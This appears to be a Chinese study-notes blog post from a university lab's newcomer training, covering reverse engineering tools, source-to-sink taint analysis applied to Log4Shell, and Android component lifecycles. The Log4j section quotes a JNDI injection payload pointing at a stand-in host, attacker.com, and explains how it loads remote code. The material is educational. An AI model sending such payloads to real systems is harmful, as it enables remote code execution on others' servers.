    软件逆向与漏洞挖掘基础

    Posted on 2026-07-13 Edited on 2026-07-14 In 学习笔记

    复旦大学系统软件与安全实验室-新生培训系列

    软件逆向——>程序分析+AI——>漏洞挖掘

    程序逆向

    程序逆向是一种分析软件的方式，旨在理解其内部结构、算法及行为。主要用于获取软件的未公开信息。

    从可运行的程序系统出发，运用解密、反汇编、系统分析、程序理解等技术对软件的结构、流程、算法、代码等进行逆向拆解和分析，推导出软件产品的源代码、设计原理、结构、算法、处理过程、运行方法及相关文档等。

    过程：一般通过逆向编译或动态调试，分析软件的汇编指令和执行流。

    源代码——编译——>编译结果——逆向——>伪代码

    逆向 这一步通常分为两个阶段：

    1. 反汇编 (Disassemble)： 利用工具（如 IDA Pro）将机器码翻译成汇编语言（Assembly Code）。汇编语言虽然也是人看的，但非常底层且晦涩。

    2. 反编译 (Decompile)： 利用高级工具（如 IDA 的 Hex-Rays 插件、Ghidra）将汇编语言进一步还原成类似 C 语言那样的高级语言结构。

    逆向技术常用工具

    反编译工具： JEB 、JADX
    [[插桩分析]]工具：Frida 、Xposed
    [[网络流量分析]]：Burpsuite/Fiddler/Char les 、Wireshark 、r0capture

    安全分析：代码中的关键信息

    用src，sink等关键代码信息表示漏洞，并在逆向分析过程中关注这些信息作为锚点

    来自用户的输入流向数据库敏感操作

    来自用户的输入 未经检查地流向数据库敏感操作，且用户输入是恶意的， 能绕过数据校验

    案例：Log4J漏洞

    著名的 Log4j 漏洞（CVE-2021-44228，又称 Log4Shell）本质上是一个由于不安全的反序列化与 JNDI 注入导致的远程代码执行（RCE）漏洞。

    为了深入理解它的运作原理，我们可以引入污点分析（Taint Analysis）和数据流分析（Data Flow Analysis）中的核心概念：Source（污染源）、Propagate（传播路径）、Sink（执行点）、Validator（验证器）和 Sanitize（数据净化）。

    以下是将这些概念映射到 Log4j 漏洞中的详细解析：

    1. Source（污染源 / 输入点）

    概念定义： Source 是指外部不可信数据进入应用程序的入口点。在安全分析中，所有未经检查的外部输入都被视为“被污染的（Tainted）”。 Log4j 中的体现： 攻击者通过构造恶意的 Payload（例如 ${jndi:ldap://attacker.com/Exploit}），并将其注入到应用程序会记录到日志中的任何位置。常见的 Source 包括：

    • HTTP 请求头： User-Agent、X-Forwarded-For、Referer。

    • 用户输入表单： 登录界面的用户名框（如果系统会记录“用户 XXX 登录失败”）。

    • API 请求参数： URL 参数或 JSON Body 中的字段。

    只要这些带有恶意字符串的数据被传递给 Log4j 的记录方法（如 logger.info(input) 或 logger.error(input)），污染源就成功进入了系统。

    2. Propagate（传播路径 / 数据流转）

    概念定义： Propagate 是指污点数据在应用程序内部函数、方法或组件之间的传递过程。漏洞的形成要求污染数据能够一路畅通无阻地从 Source 传播到 Sink。 Log4j 中的体现： 这是 Log4j 漏洞中最复杂、也是最核心的一环（即 Log4j 的字符串替换机制）。传播路径如下：

    1. 应用层调用： 业务代码调用 logger.error(payload)。

    2. 格式化处理： Log4j 接收到日志内容后，会根据配置（如 PatternLayout）对日志进行格式化。

    3. 模式转换（Converter）： Log4j 发现日志内容中包含特定的占位符，会调用 MessagePatternConverter 处理日志正文。

    4. 字符串替换（核心传播）： 内部调用 StrSubstitutor.substitute()。该方法会递归解析字符串中形如 ${prefix:name} 的内容。

    5. 路由查找器： Interpolator 会根据前缀（如 jndi）找到对应的 Lookup 类，在这个漏洞中，数据被传递给了 JndiLookup 类。

    在这个过程中，恶意字符串不仅没有被阻断，反而触发了 Log4j 内部的“高级功能”（Lookups），被系统主动解析。

    3. Sink（执行点 / 危险函数）

    概念定义： Sink 是指污点数据最终到达并触发安全问题的敏感函数或 API操作（例如执行系统命令、数据库查询或网络请求）。 Log4j 中的体现： Log4j 的 Sink 位于 JndiLookup.lookup() 方法内部。

    1. 当 JndiLookup 接收到被解析出来的字符串（如 ldap://attacker.com/Exploit）后，会直接将其传递给 JNDI（Java Naming and Directory Interface）API。

    2. 最终触发的 Java 底层危险函数是 javax.naming.InitialContext.lookup(URI)。

    3. 结果： JNDI API 会向攻击者控制的 LDAP 或 RMI 服务器发起网络请求，下载恶意的 Java Class 文件并在本地 JVM 中实例化（通过反序列化或对象工厂机制），从而执行任意代码（RCE）。

    4. Validator（验证器）

    概念定义： Validator 是指应用程序在数据流转过程中，用于检查数据是否符合预期格式、长度或白名单的安全机制。 Log4j 中的体现（漏洞发生的原因）：

    • 漏洞爆发前： Log4j 在处理 JNDI Lookup 时完全缺乏 Validator。它盲目地相信了配置和传入的字符串，不对 JNDI 连接的目标 URL 做任何域名或协议的白名单校验。

    • 修复过程中的体现（Log4j 2.15.0）： 官方在这个版本中加入了 Validator 机制，限制了 JNDI 只能连接本地的地址（如 localhost），并增加了一系列白名单类检查（只允许基础数据类型），阻断了连接任意外部恶意服务器的路径。

    5. Sanitize（净化 / 清洗）

    概念定义： Sanitize 是指对污点数据进行修改，剥离或转义其中的恶意代码，使其变得安全（例如 XSS 防御中的 HTML 实体转义）。 Log4j 中的体现（防御与彻底修复）：

    • 漏洞爆发前： Log4j 默认开启了 Message Lookups 功能，不对包含 ${} 的内容进行任何清洗，直接解析。

    • 临时防御措施： 早期防御建议将配置改为 %m{nolookups}，这相当于一种隐式的 Sanitize 策略——告诉框架不要把这部分数据当作代码解析，纯粹当作普通文本输出。

    • 彻底修复（Log4j 2.16.0 及以后）： 官方意识到修补 JNDI 的 Validator 太容易被绕过，于是选择从根本上切断传播路径，默认完全移除了 Message Lookups 功能，并最终在 2.17.0 版本中禁用了 JNDI 功能。这保证了无论传入什么恶意占位符，都会被当作纯文本处理（彻底的清洗），不再触发解析。

    总结

    如果用一句话概括 Log4j 漏洞的生命周期： 攻击者将恶意载荷投入 Source（如 HTTP Header），数据在应用内部触发 Log4j 的字符串解析机制进行 Propagate，由于系统缺乏必要的 Validator（未限制 JNDI 请求目标）和 Sanitize（未禁止日志内容的递归解析），数据最终流入 Sink（InitialContext.lookup），导致加载了远程恶意代码，完成了攻击。

    Android

    一款基于Linux内核设计的开源操作系统

    App的构成

    由各种可任意单独调用的组件构成
    四大组件+AndroidManifest.xml（配置信息）+Android permissions（访问控制）

    1. Activity（活动 —— 负责“露脸”）

    • 在 App 中： 就是你创建的每一个可视化的 .iyu 界面。

    • 作用： 它是与用户直接交互的窗口。所有的控件（按钮、文本等）摆放，以及用户的点击、滑动等操作，都在 Activity 中完成。

    2. Service（服务 —— 负责“干苦力”）

    • 在 App 中： 通常体现为后台任务代码。

    • 作用： 在用户看不见的后台默默运行。比如 App 退到桌面后，依然在后台播放音乐、下载文件或保持服务器长连接。

    3. Broadcast Receiver（广播接收器 —— 负责“听”）

    • 在 App 中： 体现为系统事件的监听代码。

    • 作用： 就像一个“收音机”。它可以接收系统或其他 App 发出的全局消息，比如监听到“网络断开”、“电量过低”或“收到短信”，然后触发你设定好的逻辑。

    4. Content Provider（内容提供者 —— 负责“共享”）

    • 在 App 中： 体现为跨应用的数据读取/写入接口。

    • 作用： 负责不同 App 之间的数据交换。在 App 开发中，你很少会去自己创建它，但会经常调用它——比如用代码读取系统的通讯录联系人、获取相册图片，本质上就是在使用其他应用的 Content Provider。

    一句话总结： Activity 负责界面展示，Service 负责后台运行，Broadcast Receiver 负责监听消息，Content Provider 负责数据共享。

    举例分析

    [[Android Activity Lifecycle]]

    用三层逻辑就可以轻松记住 Activity 生命周期的核心：

    • 第一层：生死存亡（创建与销毁）

      • onCreate()：界面出生（加载布局、初始化数据）。

      • onDestroy()：界面死亡（被彻底关闭，释放内存）。

    • 第二层：是否可见（显示与隐藏）

      • onStart()：出现在屏幕上（看得见，但还不能交互）。

      • onStop()：退到后台（完全看不见）。

    • 第三层：能否交互（聚焦与失焦）

      • onResume()：来到最前台（既能看，又能点，完全霸占屏幕）。

      • onPause()：失去焦点（被其他弹窗挡住或准备退到后台，能看到一点，但不能点）。

    极简流转路线： 出生(Create) ➔ 能看(Start) ➔ 能玩(Resume) ➔ 摸不到(Pause) ➔ 看不见(Stop) ➔ 死亡(Destroy)。 (如果从“看不见”又回到了前台，中间插一个复活 Restart)

    [[Android Service Lifecycle]]

    可以把 Service 想象成一个“后台打工人”，它有两种被老板（Activity 等组件）雇佣的模式：

    1. 临时外包模式（startService）—— “接单干活，自生自灭”

    • 流程：onCreate (建档) ➔ onStartCommand (开始干活) ➔ onDestroy (走人)。

    • 特点：老板把任务甩出去就不管了。即使老板自己关门跑路了（Activity 被销毁），打工人依然会在后台把活干完，除非老板明确发话开除（stopService），或者自己干完活下班（stopSelf）。

    1. 长期雇佣模式（bindService）—— “深度绑定，同生共死”

    • 流程：onCreate (建档) ➔ onBind (签合同交接) ➔ onUnbind (解约) ➔ onDestroy (走人)。

    • 特点：老板和打工人建立了长期沟通渠道，可以随时交互数据（比如查看播放器进度）。一旦老板关门跑路（或者主动调用 unbindService 解绑），这层雇佣关系就断了，打工人自动下班销毁。

    💡 核心生存法则（混合模式）

    如果一个 Service 既被 start 了，又被 bind 了，它就拥有了双重护身符。 此时，必须把两个条件都解除（既调用了 stopService，又调用了 unbindService），系统才会触发 onDestroy() 真正销毁它。只要其中一个条件还在，它就会一直活在后台。

    [[Android Broadcast Receiver Lifecycle]]

    用最简单的话来概括 BroadcastReceiver (广播接收器)，就是四个字：“阅后即焚”。

    • 核心动作： 听到消息 ➔ 瞬间唤醒（执行 onReceive） ➔ 办完事立刻死亡。它不保留任何记忆。

    • 最大红线： 寿命只有 10秒。绝对不能用它来干下载、请求网络等慢吞吞的重活。

    既然咱们聊完了 Android（也是 iApp 底层）最核心的这三个组件，最后给你来个一句话大汇总。以后开发 App 时，你需要做什么功能，直接对号入座即可：

    1. Activity（前台门面）： 负责抛头露面，陪用户点按交互。状态最多，也最娇贵。

    2. Service（后台车间）： 负责在用户看不见的地方默默打螺丝、播音乐。只要老板不辞退，它就一直在后台干活。

    3. BroadcastReceiver（传达室大爷）： 负责竖着耳朵听系统喇叭，听到特定通知（比如没电了、来短信了）就触发个小动作，做完立刻消失。只管传话，不干重活。

    [[Android Content Provider Lifecycle]]

    可以把 Content Provider 想象成一个 App 专属的“对外营业的数据仓库”。

    • 流程：onCreate (开张营业) ➔ query/insert (接待客户查阅或存取) ➔ 伴随 App 进程被强制杀掉而关门。

    • 三大特点：

      1. 开业最早，永不打烊：它是 App 里醒得最早的组件，一开门就不关，没有销毁方法（没有 onDestroy）。

      2. 专门搞外交：专门负责把 App 内部的数据（比如相册图片、通讯录号码）按规矩共享给其他 App 使用。

      3. 能同时接待多人：因为随时可能有多个 App 一起来查数据，所以它干活（增删改查）都在后台线程池里，必须保证数据不乱套。

    一句话总结： 只有“开张”没有“打烊”，默默为其他 App 提供数据共享服务的跨界大仓库。

    Android App Development

    对抗分析的手段-逆向中可能遇到的一些困难

    [[加壳]]：在计算机科学和软件安全领域，“加壳”（Software Packing）是指将可执行文件（如 .exe、.dll、.apk 等）进行压缩、加密或混淆，并为其附加一段特殊代码（称为“壳”代码或 Stub）的过程。

    [[反调试]]：反调试技术是指程序用来检测自身是否正在被调试器（Debugger，如 x64dbg, OllyDbg, GDB 等）附加、监控或分析的一系列技术手段。一旦程序发现自己处于调试状态，它通常会采取自我保护措施，例如自行退出、崩溃、改变执行逻辑或销毁核心数据。

    [[动态类加载]]：应用不将所有代码打包在初始Dex中，而是在运行时从服务器、本地文件或内存中动态加载并执行，以此隐藏核心逻辑，增加静态分析的难度。

    [[代码混淆]]：在编译过程中对类、方法、变量名进行无意义的重命名（如改为a,b,c），并可能插入冗余代码、改变控制流，使得反编译后的代码可读性极差，难以理解其业务逻辑。
